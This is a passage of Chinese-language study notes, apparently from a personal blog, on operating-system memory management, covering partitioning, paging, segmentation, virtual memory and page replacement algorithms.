&lt;p&gt;内存空间保护的实现是通过 CPU 硬件对在用户态下产生的物理地址与寄存器地址进行比较来完成的，即判断 &amp;quot;基地址 &amp;lt;= 物理地址 &amp;lt;(基地址 + 界限地址)&amp;quot;&lt;/p&gt;
&lt;h3 id=&#34;31_3-覆盖与交换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_3-覆盖与交换&#34;&gt;#&lt;/a&gt; 3.1_3 覆盖与交换&lt;/h3&gt;
&lt;p&gt;内存空间的扩充&lt;/p&gt;
&lt;p&gt;覆盖技术：将程序分为多个段，内存分为” 固定区 “和” 覆盖区 “，需要常驻的放在” 固定区 “，调入后就不再调出，不常用的段放在” 覆盖区 “，需要用到时调入内存，用不到时掉出内存&lt;/p&gt;
&lt;p&gt;必须由程序员声明覆盖结构，操作系统完成自动覆盖。缺点：对用户不透明，增加了用户编程负担。&lt;br&gt;
覆盖技术只用于早期的操作系统中，现在已成为历史。&lt;/p&gt;
&lt;p&gt;交换技术：内存空间紧张时，系统将内存中某些进程暂时换出外存，把外存中某些已具备运行条件的进程换入内存（PCB 会常驻内存，不会被换出）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728163541263.png&#34; alt=&#34;image-20230728163541263&#34;&gt;&lt;/p&gt;
&lt;p&gt;换出进程：只能换出非共享的程序和数据段，而对那些共享的程序和数据段，只要还有进程需要他，就不能被换出。&lt;/p&gt;
&lt;h3 id=&#34;31_4-连续分配管理方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_4-连续分配管理方式&#34;&gt;#&lt;/a&gt; 3.1_4 连续分配管理方式&lt;/h3&gt;
&lt;p&gt;连续分配方式指为用户进程分配的必须是一个连续的内存空间&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;单一连续分配&lt;/strong&gt;：内存被分配为系统区和用户区，系统区在低地址用于存放操作系统相关数据，用户区用于存放用户进程相关数据，内存中只能有一道用户程序，用户程序独占整个用户区空间。&lt;br&gt;
优点：实现简单；无外部碎片：可以采用覆盖技术扩充内存；不一定需要采取内存保护 (eg: 早期的 PC 操作&lt;br&gt;
系统 MS-DOS)&lt;/p&gt;
&lt;p&gt;缺点：只能用于单用户、单任务的操作系统中；有内部碎片；存储器利用率极低。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;固定分区分配&lt;/strong&gt;：将用户区分割为若干固定分区给各道程序，分割策略有分区大小相等和分区大小不相等，可以建议一个分区说明表来管理各个分区&lt;/p&gt;
&lt;p&gt;分区大小相等：缺乏灵活性，但是很适合用于用一台计算机控制多个相同对象的场合&lt;/p&gt;
&lt;p&gt;分区大小不等：增加了灵活性，可以满足不同大小的进程需求。根据常在系统中运行的作业大小情况进行划分 (比如：划分多个小分区、适量中等分区、少量大分区)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;固定分区分配&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;优点：实现简单，无外部碎片&lt;/p&gt;
&lt;p&gt;缺点：. 当用户程序太大时，可能所有的分区都不能满足需求，此时不得不采用覆盖技术来解决，但这又会降低性能；b. 会产生内部碎片，内存利用率低。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;动态分区分配&lt;/strong&gt;：可变分区分配，不会预先划分内存分区，而是在进程装入内存时，根据进程的大小动态地建立分区，并使分区的大小正好适合进程的需要。&lt;/p&gt;
&lt;p&gt;内部碎片：已经被分配出去（能明确指出属于哪个进程）却不能被利用的内存空间；&lt;/p&gt;
&lt;p&gt;外部碎片：还没有被分配出去（指内存中的某些空闲分区），但由于太小无法利用&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728171956635.png&#34; alt=&#34;image-20230728171956635&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;31_5-动态分区分配算法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_5-动态分区分配算法&#34;&gt;#&lt;/a&gt; 3.1_5 动态分区分配算法&lt;/h3&gt;
&lt;p&gt;1、首次适应算法（First Fit)&lt;/p&gt;
&lt;p&gt;算法思想：每次从低地址开始查找，找到第一个能满足大小的空闲分区&lt;/p&gt;
&lt;p&gt;如何实现：空闲分区以&lt;strong&gt;地址&lt;/strong&gt;递增的次序排列。每次分配内存时顺序查找空闲分区链或空闲分区表，找到大小能满足要求的第一个分区&lt;/p&gt;
&lt;p&gt;2、最佳适应算法 (Best Fit)&lt;/p&gt;
&lt;p&gt;算法思想：由于动态分区分配是一种连续分配方式，为各进程分配的空间必须是连续的一整片区&lt;br&gt;
域。因此为了保证当 “大进程” 到来时能有连续的大片空间，可以尽可能多地留下大片的空闲区，&lt;br&gt;
即，优先使用更小的空闲区。&lt;/p&gt;
&lt;p&gt;如何实现：空闲分区按&lt;strong&gt;容量&lt;/strong&gt;递增次序链接。每次分配内存时顺序查找空闲分区链（或空闲分区&lt;br&gt;
表)，找到大小能满足要求的第一个空闲分区。&lt;/p&gt;
&lt;p&gt;缺点：每次都选最小的分区进行分配，会留下越来越多的、很小的、难以利用的内存块。因此这种方法会产生很多的外部碎片。&lt;/p&gt;
&lt;p&gt;3、最坏适应算法 (Worst Fit)&lt;/p&gt;
&lt;p&gt;算法思想：为了解决最佳适应算法的问题一一即留下太多难以利用的小碎片，可以在每次分配时&lt;br&gt;
优先使用最大的连续空闲区，这样分配后剩余的空闲区就不会太小，更方便使用。&lt;br&gt;
如何实现：空闲分区按容量递减次序链接。每次分配内存时顺序查找空闲分区链（或空闲分区&lt;br&gt;
表)，找到大小能满足要求的第一个定闲分区&lt;/p&gt;
&lt;p&gt;缺点：每次都选最大的分区进行分配，虽然可以让分配后留下的空闲区更大，更可用，但是这种方式会导致较大的连续空闲区被迅速用完。如果之后有 “大进程” 到达，就没有内存分区可用了。&lt;/p&gt;
&lt;p&gt;4、领近适应算法 (Next Fit)（循环首次适应算法）&lt;/p&gt;
&lt;p&gt;算法思想：首次适应算法每次都从链头开始查找的。这可能会导致低地址部分出现很多小的空闲&lt;br&gt;
分区，而每次分配查找时，都要经过这些分区，因此也增加了查找的开销。如果每次都从上次查&lt;br&gt;
找结束的位置开始检索，就能解决上述问题。&lt;br&gt;
如何实现：空闲分区以地址递增的顺序排列（可排成一个循环链表）。每次分配内存时从上次查&lt;br&gt;
找结束的位置开始查找空闲分区链或空闲分区表)，找到大小能满足要求的第一个空闲分区。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728175630016.png&#34; alt=&#34;image-20230728175630016&#34;&gt;&lt;/p&gt;
&lt;p&gt;四种算法中 首次适应算法比较好&lt;/p&gt;
&lt;h3 id=&#34;31_6-基本分页存储管理的基本概念&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_6-基本分页存储管理的基本概念&#34;&gt;#&lt;/a&gt; 3.1_6 基本分页存储管理的基本概念&lt;/h3&gt;
&lt;p&gt;1B=8bit&lt;/p&gt;
&lt;p&gt;1KB=2&lt;sup&gt;10&lt;/sup&gt;B&lt;/p&gt;
&lt;p&gt;1MB=2&lt;sup&gt;20&lt;/sup&gt;B&lt;/p&gt;
&lt;p&gt;1GB=2&lt;sup&gt;30&lt;/sup&gt;B&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728191253317.png&#34; alt=&#34;image-20230728191253317&#34;&gt;&lt;/p&gt;
&lt;p&gt;允许一个进程分散地装入到许多不相邻的位置&lt;/p&gt;
&lt;p&gt;连续分配：为用户进程分配连续的内存空间&lt;/p&gt;
&lt;p&gt;非连续分配：为用户进程分配分散的内存空间&lt;/p&gt;
&lt;p&gt;将内存分为大小相等的小分区 “页框”，将用户的进程空间也分为大小相等的一个个区域，以页框的基本单位分配给每个进程片&lt;/p&gt;
&lt;p&gt;分页管理：物理地址 = 页面的起始位置 + 偏移量&lt;/p&gt;
&lt;p&gt;计算机中用 2 的整数倍表示页面的大小&lt;/p&gt;
&lt;p&gt;页表：存放页号和块号的对应关系&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728194719850.png&#34; alt=&#34;image-20230728194719850&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728195243807.png&#34; alt=&#34;image-20230728195243807&#34;&gt;&lt;/p&gt;
&lt;p&gt;逻辑地址变为物理地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230803141545724.png&#34; alt=&#34;image-20230803141545724&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230803141812641.png&#34; alt=&#34;image-20230803141812641&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;31_7-基本地址变换机构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_7-基本地址变换机构&#34;&gt;#&lt;/a&gt; 3.1_7 基本地址变换机构&lt;/h3&gt;
&lt;p&gt;页表寄存器（PTR），存放页表在内存中的起始地址 F 和页表长度 M，进程未执行时，页表的起始地址和页表的长度放在进程控制块（PCB）中，当进程被调度时，操作系统内核会把它们放在页表寄存器中。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728223649189.png&#34; alt=&#34;image-20230728223649189&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;31_8-具有快表的地址变换机构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_8-具有快表的地址变换机构&#34;&gt;#&lt;/a&gt; 3.1_8 具有快表的地址变换机构&lt;/h3&gt;
&lt;p&gt;1、局部性原理&lt;/p&gt;
&lt;p&gt;时间局部性：访问某个数据后，在不久的将来还会被访问&lt;/p&gt;
&lt;p&gt;空间局部性：程序访问了某个存储单元，不久之后，其附近的存储单元也很有可能被访问&lt;/p&gt;
&lt;p&gt;2、什么是快表（TLB）&lt;/p&gt;
&lt;p&gt;快表：又称联想寄存器（TLB），是一种访问速度比内存快很多的高速缓冲 ，用来存放当前访问的若干页表项，以加速地址变换的过程。与此对应，内存中的页表常称为慢表。&lt;/p&gt;
&lt;p&gt;3、引入快表后，地址的变换过程&lt;/p&gt;
&lt;p&gt;①CPU 给出逻辑地址，由某个硬件算得页号、页内偏移量，将页号与快表中的所有页号进行比较。&lt;br&gt;
②如果找到匹配的页号，说明要访问的页表项在快表中有副本，则直接从中取出该页对应的内存块&lt;br&gt;
号，再将内存块号与页内偏移量拼接形成物理地址，最后，访问该物理地址对应的内存单元。因此，&lt;br&gt;
若快表命中，则访问某个逻辑地址仅需一次访存即可。&lt;br&gt;
③如果没有找到匹配的页号，则需要访问内存中的页表，找到对应页表项，得到页面存放的内存块&lt;br&gt;
号，再将内存块号与页内偏移量拼接形成物理地址，最后，访问该物理地址对应的内存单元。因此，&lt;br&gt;
若快表未命中，则访问某个逻辑地址需要两次访存（注意：在找到页表项后，应同时将其存入快表，&lt;br&gt;
以便后面可能的再次访问。但若快表已满，则必须按照一定的算法对旧的页表项进行替换)&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728224622441.png&#34; alt=&#34;image-20230728224622441&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;31_9-两级页表&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_9-两级页表&#34;&gt;#&lt;/a&gt; 3.1_9 两级页表&lt;/h3&gt;
&lt;p&gt;1、单级页表存在什么问题？如何解决？&lt;/p&gt;
&lt;p&gt;所有页表项必须连续存放，页表过大时需要很大的连续空间&lt;/p&gt;
&lt;p&gt;在一段时间内并非所有页面都用得到，因此没必要让整个页表常驻内存&lt;/p&gt;
&lt;p&gt;2、两级页表的原理、逻辑地址结构&lt;/p&gt;
&lt;p&gt;将长长的页表再分页&lt;/p&gt;
&lt;p&gt;逻辑地址结构：（一级页号、二级页号、页内偏移量）&lt;/p&gt;
&lt;p&gt;页目录表、外层页表、顶级页表&lt;/p&gt;
&lt;p&gt;3、如何实现地址变换？&lt;/p&gt;
&lt;p&gt;按照地址结构将逻辑地址拆分成三部分&lt;/p&gt;
&lt;p&gt;从 PCB 中读出页目录表始址，根据一级页号查页目录表，找到下一级页表在内存中的存放位置&lt;/p&gt;
&lt;p&gt;根据二级页号查表，找到最终想访问的内存块号&lt;/p&gt;
&lt;p&gt;结合页内偏移量得到物理地址&lt;/p&gt;
&lt;p&gt;4、两级页表问题需要注意的几个细节&lt;/p&gt;
&lt;p&gt;多级页表中，各级页表的大小不能超过一个页面。若两级页表不够，可以分更多级&lt;/p&gt;
&lt;p&gt;多级页表的访问次数（假设没有快表结构）——N 级页表访问一个逻辑地址需要 N+1 次访存&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230729153926400.png&#34; alt=&#34;image-20230729153926400&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;31_10-基本分段存储管理方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_10-基本分段存储管理方式&#34;&gt;#&lt;/a&gt; 3.1_10 基本分段存储管理方式&lt;/h3&gt;
&lt;p&gt;1、什么是分段？&lt;/p&gt;
&lt;p&gt;进程的地址空间：按照程序自身的逻辑关系划分为若干个段，每段有段名，每段从 0 开始编址&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;段号的位数决定了每个进程最多可以分几个段&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;段内地址位数决定了每个段的最大长度是多少&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;内存分配规则：以段为单位进行分配，每个段在内存中占据连续空间，但各段之间可以不相邻。&lt;/p&gt;
&lt;p&gt;若段表存放的起始地址为 M, 则 K 号段对应的段表项存放的地址为 M+K*6B&lt;/p&gt;
&lt;p&gt;2、什么是段表&lt;/p&gt;
&lt;p&gt;段表：段映射表&lt;/p&gt;
&lt;p&gt;每个程序被分段后，用段表记录该程序在内存中存放的位置&lt;/p&gt;
&lt;p&gt;段表：段号 段长 基址&lt;/p&gt;
&lt;p&gt;3、如何实现地址变换&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230729164000796.png&#34; alt=&#34;image-20230729164000796&#34;&gt;&lt;/p&gt;
&lt;p&gt;4、分段、分页管理的对比&lt;/p&gt;
&lt;p&gt;页是信息的物理单位。分页的主要目的是为了实现离散分配，提高内存利用率。分页仅仅是系统管&lt;br&gt;
理上的需要，完全是系统行为，对用户是不可见的。&lt;br&gt;
段是信息的逻辑单位。分段的主要目的是更好地满足用户需求。一个段通常包含着一组属于一个逻&lt;br&gt;
辑模块的信息。分段对用户是可见的，用户编程时需要显式地给出段名。&lt;/p&gt;
&lt;p&gt;页的大小固定且由系统决定。段的长度却不固定，决定于用户编写的程序。&lt;br&gt;
分页的用户进程地址空间是一维的，程序员只需给出一个记忆符即可表示一个地址。&lt;br&gt;
分段的用户进程地址空间是二维的，程序员在标识一个地址时，既要给出段名，也要给出段内地址。&lt;/p&gt;
&lt;p&gt;分段比分页更容易实现信息的共享和保护（不能被修改的代码称为纯代码和可重入代码，不属于临界资源）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问一个逻辑地址需要几次访存&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;分页（单级页表）：第一次访存一一查内存中的页表，第二次访存一一访问目标内存单元。总共两次&lt;br&gt;
访存&lt;br&gt;
分段：第一次访存一一查内存中的段表，第二次访存一一访问目标内存单元。总共两次访存&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230729171748011.png&#34; alt=&#34;image-20230729171748011&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;31_11-段页式的管理方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_11-段页式的管理方式&#34;&gt;#&lt;/a&gt; 3.1_11 段页式的管理方式&lt;/h3&gt;
&lt;h4 id=&#34;1-分页-分段管理方式最大的优缺点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-分页-分段管理方式最大的优缺点&#34;&gt;#&lt;/a&gt; 1、分页、分段管理方式最大的优缺点&lt;/h4&gt;
&lt;p&gt;分页：优点：利用率高，碎片少，不会产生外部碎片只有少量内部碎片&lt;/p&gt;
&lt;p&gt;缺点：不方便进行信息共享和保护&lt;/p&gt;
&lt;p&gt;分段：优点：方便信息共享和保护，&lt;/p&gt;
&lt;p&gt;缺点：如果段长过大，为其分配很大的连续空间会很不方便，段式管理容易产生外部碎片&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;段号的位数决定了每个进程最多可以分几个段&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;页号位数决定了每个段最大有多少页&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;页内偏移量决定了页面大小、内存块大小是多少&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一个进程会对应一个段表  一个进程有可能对应多个页表&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;2-分段分页的结合段页式管理方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-分段分页的结合段页式管理方式&#34;&gt;#&lt;/a&gt; 2、分段 + 分页的结合 —— 段页式管理方式&lt;/h4&gt;
&lt;p&gt;先分段再分页&lt;/p&gt;
&lt;p&gt;段号 + 页号 + 页内偏移量&lt;/p&gt;
&lt;p&gt;地址结构是二维的&lt;/p&gt;
&lt;p&gt;4、如何实现地址变换&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230729181321218.png&#34; alt=&#34;image-20230729181321218&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230729181447895.png&#34; alt=&#34;image-20230729181447895&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;页号合法但该页未装人内存故产生缺页中断&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#页号合法但该页未装人内存故产生缺页中断&#34;&gt;#&lt;/a&gt; 页号合法，但该页未装人内存，故产生缺页中断。&lt;/h2&gt;
&lt;h2 id=&#34;页号非法及内存中不存在该页号故产生越界中断&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#页号非法及内存中不存在该页号故产生越界中断&#34;&gt;#&lt;/a&gt; 页号非法，及内存中不存在该页号，故产生越界中断。&lt;/h2&gt;
&lt;h3 id=&#34;32_1-虚拟内存的基本概念&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#32_1-虚拟内存的基本概念&#34;&gt;#&lt;/a&gt; 3.2_1 虚拟内存的基本概念&lt;/h3&gt;
&lt;p&gt;1、传统存储管理方式的特征、缺点&lt;/p&gt;
&lt;p&gt;传统存储管理包括：连续分配 和非连续分配&lt;/p&gt;
&lt;p&gt;连续分配：单一连续分配，固定分区分配，动态分区分配&lt;/p&gt;
&lt;p&gt;非连续分配：基本分页存储管理，基本分段存储管理，基本段页式存储管理&lt;/p&gt;
&lt;p&gt;常规存储器管理方式的两大特征：一次性，驻留性&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;缺点：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一次性：作业必须一次性全部装入内存后才能开始运行。这会造成两个问题：①作业很大时，不能全&lt;br&gt;
部装入内存，导致大作业无法运行：②当大量作业要求运行时，由于内存无法容纳所有作业，因此只&lt;br&gt;
有少量作业能运行，导致多道程序并发度下降。&lt;/p&gt;
&lt;p&gt;驻留性：一旦作业被装入内存，就会一直驻留在内存中，直至作业运行结束。&lt;/p&gt;
&lt;p&gt;2、局部性原理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;时间局部性：现在访问的指令、数据在不久后很可能会被再次访问&lt;/li&gt;
&lt;li&gt;空间局部性：现在访问的内存单元周围的内存空间，很可能在不就后会被访问&lt;/li&gt;
&lt;li&gt;高速缓存技术：使用频繁的数据放到更高速的存储器中&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;前面写过&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;3、虚拟内存的定义和特征&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;三个主要特征&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;多次性：无需在作业运行时一次性全部装入内存，而是允许被分成多次调用内存&lt;/p&gt;
&lt;p&gt;对换性：在作业运行时无需一直常驻内存，而是允许在作业运行过程中，将作业换入换出&lt;/p&gt;
&lt;p&gt;虚拟性：从逻辑上扩充了内存的容量，使用户看到的内存容量，远大于实际的容量&lt;/p&gt;
&lt;p&gt;虚拟内存最大容量是计算机地址结构确定的&lt;/p&gt;
&lt;p&gt;虚拟内存的实际容量 = min (内存和外存容量之和，CPU 寻址范围)&lt;/p&gt;
&lt;p&gt;eg：某计算机地址结构为 32 位，按字节编址，内存大小为 512MB，外存大小为 2GB.&lt;/p&gt;
&lt;p&gt;则虚拟内存的最大容量为 2^32B=4GB&lt;/p&gt;
&lt;p&gt;虚拟内存的实际容量 = min (2^32B,512MB+2GB)=2GB+512MB&lt;/p&gt;
&lt;p&gt;4、如何实现虚拟内存技术&lt;/p&gt;
&lt;p&gt;在程序执行过程中，当所访问的信息不再内存时，由操作系统负责将所需信息从外存调入内存，然后继续执行程序。若内存空间不够，由操作系统负责将内存中暂时用不到的信息换出到外存。&lt;/p&gt;
&lt;h1 id=&#34;内存管理总概念&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内存管理总概念&#34;&gt;#&lt;/a&gt; 内存管理总概念&lt;/h1&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230803202441641.png&#34; alt=&#34;image-20230803202441641&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;32_2-请求分页管理方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#32_2-请求分页管理方式&#34;&gt;#&lt;/a&gt; 3.2_2 请求分页管理方式&lt;/h3&gt;
&lt;p&gt;1、页表机制&lt;/p&gt;
&lt;p&gt;请求分页存储的页表：&lt;/p&gt;
&lt;p&gt;内存块号 状态位 访问字段 修改位 外存地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230803211913696.png&#34; alt=&#34;image-20230803211913696&#34;&gt;&lt;/p&gt;
&lt;p&gt;2、缺页中断机制&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为什么会产生缺页中断&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;缺页中断是因为当前执行的指令想要访问的目标页面未调入内存而产生的，因此属于内中断&lt;br&gt;
条指令在执行期间，可能产生多次缺页中断。（如：copy A to B, 即将逻辑地址 A 中的数据复制到&lt;br&gt;
逻辑地址 B, 而 A、B 属于不同的页面，则有可能产生两次中断)&lt;/p&gt;
&lt;p&gt;在请求分页系统中，每当要访问的页面不在内存时，便产生一个缺页中断，然后由操作系统的缺页中断处理程序处理中断。此时缺页的进程阻塞，放入阻塞队列，调页完成后再将其唤醒，放回就绪队列。如果内存中有空闲块，则为进程分配一个空闲块，将所缺页面装入该块，并修改页表中相应的页表项。&lt;/p&gt;
&lt;p&gt;内中断，可被修复&lt;/p&gt;
&lt;p&gt;3、地址变换机构&lt;/p&gt;
&lt;p&gt;在具有快表机构的请求分页系统中，访问一个逻辑地址时，若发生缺页，则地址变换步骤是查快表（未命中）一一查慢表（发现未调入内存）一一调页（调入的页面对应的表项会直接加入快表) 一一查快表（命&lt;br&gt;
中) 一一访间目标内存单元&lt;/p&gt;
&lt;p&gt;补充细节：&lt;br&gt;
①只有 “写指令” 才需要修改 “修改位”。并且，一般来说只需修改快表中的数据，只有要将快表项删除时才需要写回内存中的慢表。这样可以减少访存次数&lt;br&gt;
②和普通的中断处理一样，缺页中断处理依然需要保留 CPU 现场。&lt;br&gt;
③需要用某种 “页面置换算法” 来决定一个换出页面（下节内容&lt;br&gt;
④换入 / 换出页面都需要启动慢速的 / O 操作，可见，如果换入 / 换出太频繁，会有很大的开销。&lt;br&gt;
⑤页面调入内存后，需要修改慢表，同时也需要将表项复制到快 表中&lt;/p&gt;
&lt;p&gt;找到页表项是需要检查页面是否在内存中&lt;br&gt;
若页面不再内存中，需要请求调页&lt;br&gt;
若内存空间不够，还需换出页面&lt;br&gt;
页面调入内存后，需要修改相应页表项&lt;/p&gt;
&lt;h3 id=&#34;32_3-页面置换算法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#32_3-页面置换算法&#34;&gt;#&lt;/a&gt; 3.2_3 页面置换算法&lt;/h3&gt;
&lt;h4 id=&#34;1-最佳置换算法opt&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-最佳置换算法opt&#34;&gt;#&lt;/a&gt; 1、最佳置换算法（OPT）&lt;/h4&gt;
&lt;p&gt;每次选择淘汰的页面是以后永不使用或者在最长时间内不再被访问的页面，这样可以保证最低的缺页率。&lt;/p&gt;
&lt;p&gt;选择从内存中淘汰一页。按最佳置换的规则，往后寻找，最后一个出现的页号就是要淘汰的页面&lt;br&gt;
&lt;strong&gt;注意：缺页时未必发生页面置换。若还有可用的空闲内存块，就不用进行页面置换。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;缺页率 = 缺页中断的次数 / 访问页面的总次数&lt;/p&gt;
&lt;p&gt;最佳置换算法是一种理想中的算法 在现实中不可能实现&lt;/p&gt;
&lt;h4 id=&#34;2-先进先出置换算法fifo&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-先进先出置换算法fifo&#34;&gt;#&lt;/a&gt; 2、先进先出置换算法（FIFO）&lt;/h4&gt;
&lt;p&gt;每次选择淘汰的页面是最早进入内存的页面&lt;/p&gt;
&lt;p&gt;实现方法：把调入内存的页面根据调入的先后顺序排成一个队列，需要换出页面时选择队头页面即可。&lt;br&gt;
队列的最大长度取决于系统为进程分配了多少个内存块。&lt;/p&gt;
&lt;p&gt;Belady 异常，当分配的内存块增大时，缺页次数反而增加&lt;/p&gt;
&lt;p&gt;只有先进先出算法会产 Belady 异常&lt;/p&gt;
&lt;p&gt;算法性能差&lt;/p&gt;
&lt;h4 id=&#34;3-最近最久未使用置换算法lru&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-最近最久未使用置换算法lru&#34;&gt;#&lt;/a&gt; 3、最近最久未使用置换算法（LRU）&lt;/h4&gt;
&lt;p&gt;每次淘汰最近最久未使用的页面&lt;/p&gt;
&lt;p&gt;实现方法：赋予每个页面对应的页表项中，用访问字段记录该页面自上次被访问以来所经历的时间 t。&lt;br&gt;
当需要淘汰一个页面时，选择现有页面中 t 值最大的，也就是最近访问时间最短的，即最近最久未使用的页面。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230803220649438.png&#34; alt=&#34;image-20230803220649438&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最佳置换算法性能最好，但无法实现；先进先出置换算法实现简单，但算法性能差；最近最久未使用&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;置换算法性能好，是最接近 OPT 算法性能的，但是实现起来需要专门的硬件支持，算法开销大。&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;时钟置换算法是一种性能和开销较均衡的算法，又称 CLOCK 算法，或最近未用算法 (NRU,Not&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;Recently Used&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;4-时钟置换算法最近未用算法clock&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-时钟置换算法最近未用算法clock&#34;&gt;#&lt;/a&gt; 4、时钟置换算法（最近未用算法，CLOCK）&lt;/h4&gt;
&lt;p&gt;简单的 CLOCK 算法实现方法：为每个页面设置一个访问位，再将内存中的页面都通过链接指针链接成&lt;br&gt;
一个循环队列。当某页被访问时，其访问位置为 1。当需要淘汰一个页面时，只需检查页的访问位。&lt;br&gt;
如果是 0，就选择该页换出；如果是 1，则将它置为 0，暂不换出，继续检查下一个页面，若第一轮扫&lt;br&gt;
描中所有页面都是 1，则将这些页面的访问位依次置为 0 后，再进行第二轮扫描（第二轮扫描中一定会&lt;br&gt;
有访问位为 0 的页面，因此简单的 CLOCK 算法选择一个淘汰页面最多会经过两轮扫描)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;简单的：淘汰一个页面最多经历两轮扫描，初始为 1，扫一下为 0，再扫一下被踢&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;5-改进型的时钟置换算法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-改进型的时钟置换算法&#34;&gt;#&lt;/a&gt; 5、改进型的时钟置换算法&lt;/h4&gt;
&lt;p&gt;因此，除了考虑一个页面最近有没有被访问过之外，操作系统还应考虑页面有没有被修改过。在其他&lt;br&gt;
